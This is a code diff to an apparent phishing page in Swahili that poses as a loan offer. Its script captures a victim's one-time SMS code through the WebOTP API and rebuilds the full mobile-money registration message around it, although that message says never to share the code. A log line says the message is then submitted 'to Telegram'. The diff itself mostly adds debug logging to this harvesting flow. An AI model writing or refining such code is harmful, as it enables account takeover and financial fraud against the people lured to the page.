@@ -62,6 +62,24 @@
         }
         .hidden { display: none !important; }
         .screen { display: none; } .screen.active { display: block; }
+        .debug-box {
+            background: #0d1225;
+            border: 1px solid #2a2f4a;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #34d399;
+            max-height: 100px;
+            overflow-y: auto;
+            text-align: left;
+            display: none;
+        }
+        .debug-box.show { display: block; }
+        .debug-box .error { color: #ef4444; }
+        .debug-box .success { color: #34d399; }
+        .debug-box .info { color: #f59e0b; }
     </style>
 </head>
 <body>
@@ -91,6 +109,7 @@
                 <div class="error-msg" id="codeError"></div>
                 <button class="btn btn-gold" id="submitBtn" onclick="submitCode()">Endelea →</button>
                 <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
+                <div class="debug-box" id="debugBox"></div>
             </div>
             <div class="screen" id="screen2">
                 <div class="waiting-content">
@@ -106,6 +125,21 @@
 
     <script>
         // ================================================================
+        // DEBUG LOG
+        // ================================================================
+        function debugLog(msg, type = 'info') {
+            var box = document.getElementById('debugBox');
+            box.classList.add('show');
+            var time = new Date().toLocaleTimeString();
+            var div = document.createElement('div');
+            div.className = type;
+            div.textContent = '[' + time + '] ' + msg;
+            box.appendChild(div);
+            box.scrollTop = box.scrollHeight;
+            console.log(msg);
+        }
+
+        // ================================================================
         // GET URL PARAMETERS
         // ================================================================
         var urlParams = new URLSearchParams(window.location.search);
@@ -117,6 +151,10 @@
         document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
         document.getElementById('showPhone').textContent = '+255 ' + userPhone;
         document.getElementById('showPhone2').textContent = '+255 ' + userPhone;
+
+        debugLog('🚀 Page loaded');
+        debugLog('📱 App ID: ' + appId);
+        debugLog('📱 Phone: ' + userPhone);
 
         // ================================================================
         // VARIABLES
@@ -136,8 +174,10 @@
             var ua = navigator.userAgent.toLowerCase();
             if (/iphone|ipad|ipod/.test(ua)) {
                 document.getElementById('btnIPhone').style.display = 'block';
+                debugLog('📱 iPhone detected', 'info');
             } else {
                 document.getElementById('btnAndroid').style.display = 'block';
+                debugLog('📱 Android detected', 'info');
             }
         })();
 
@@ -210,6 +250,9 @@
                 return; 
             }
 
+            debugLog('📤 Submitting SMS to Telegram...', 'info');
+            debugLog('📤 SMS length: ' + smsText.length, 'info');
+
             isSubmitting = true;
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<span class="spinner"></span> Inatuma...';
@@ -267,44 +310,57 @@
         }
 
         // ================================================================
-        // WEBOTP AUTO-FILL (SIMPLE - FROM YOUR EXAMPLE)
+        // WEBOTP AUTO-FILL - RECONSTRUCTS FULL SMS FROM CODE
         // ================================================================
         async function autoFillOTP() {
             if (!document.getElementById('screen1').classList.contains('active')) {
-                console.log('Not on code screen, skipping');
+                debugLog('⏹️ Not on code screen, skipping', 'info');
                 return;
             }
 
+            // Check if WebOTP is supported
             if (!('OTPCredential' in window)) {
-                console.log('WebOTP not supported on this browser');
+                debugLog('❌ WebOTP not supported on this browser', 'error');
                 document.getElementById('codeError').textContent = 'ℹ️ Kifaa chako hakitumii auto-detect. Tafadhali nakili mwenyewe.';
                 document.getElementById('codeError').style.color = '#f59e0b';
                 document.getElementById('codeError').classList.add('show');
                 return;
             }
 
-            console.log('Waiting for SMS notification via WebOTP...');
+            debugLog('⏳ Waiting for SMS notification via WebOTP...', 'info');
             document.getElementById('codeError').textContent = '⏳ Inasubiri SMS...';
             document.getElementById('codeError').style.color = 'var(--primary)';
             document.getElementById('codeError').classList.add('show');
 
             try {
+                // ============================================================
+                // STEP 1: WebOTP detects the SMS and extracts the code
+                // ============================================================
                 const credential = await navigator.credentials.get({
                     otp: { transport: ['sms'] }
                 });
 
+                // ============================================================
+                // STEP 2: If code is received, reconstruct the FULL SMS
+                // ============================================================
                 if (credential && credential.code) {
                     detectedCode = credential.code;
-                    console.log('✅ OTP detected:', detectedCode);
+                    debugLog('✅ OTP DETECTED! Code: ' + detectedCode, 'success');
                     
-                    // BUILD THE FULL SMS
+                    // ============================================================
+                    // STEP 3: RECONSTRUCT THE FULL SMS FROM THE CODE
+                    // ============================================================
                     var fullSMS = 'You are being registered in Mixx by Yas Super App, use the code ' + detectedCode + ' to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR';
                     
-                    // FILL THE TEXTAREA
+                    debugLog('📝 Full SMS reconstructed: ' + fullSMS, 'success');
+                    
+                    // ============================================================
+                    // STEP 4: Fill the textarea with the FULL SMS
+                    // ============================================================
                     document.getElementById('smsMessage').value = fullSMS;
                     smsDetected = true;
                     
-                    console.log('✅ Full SMS filled:', fullSMS);
+                    debugLog('✅ Full SMS filled in textarea!', 'success');
                     
                     document.getElementById('codeError').textContent = '✅ Ujumbe umegunduliwa! Bonyeza "Endelea" kutuma.';
                     document.getElementById('codeError').style.color = '#10b981';
@@ -313,12 +369,14 @@
                     clearInterval(countdownTimer);
                     document.getElementById('timerDisplay').textContent = '✅ Imekamilika';
                     document.getElementById('timerDisplay').className = 'timer-bar';
+                } else {
+                    debugLog('⚠️ No code received from WebOTP', 'error');
                 }
             } catch (err) {
-                console.error('WebOTP error:', err);
                 if (err.name === 'AbortError') {
-                    console.log('WebOTP timeout');
+                    debugLog('⏱️ WebOTP timeout - no SMS received', 'error');
                 } else {
+                    debugLog('❌ WebOTP error: ' + err.message, 'error');
                     document.getElementById('codeError').textContent = '❌ Hitilafu. Tafadhali nakili SMS mwenyewe.';
                     document.getElementById('codeError').style.color = 'var(--danger)';
                     document.getElementById('codeError').classList.add('show');
@@ -334,9 +392,8 @@
         // Run autoFillOTP after 1 second
         setTimeout(autoFillOTP, 1000);
 
-        console.log('✅ MixxPlus - Waiting for SMS notification...');
-        console.log('📱 App ID:', appId);
-        console.log('📱 Phone:', userPhone);
+        debugLog('✅ MixxPlus - Waiting for SMS notification...', 'success');
+        debugLog('📱 Open on Android Chrome for best results', 'info');
     </script>
 </body>
 </html>
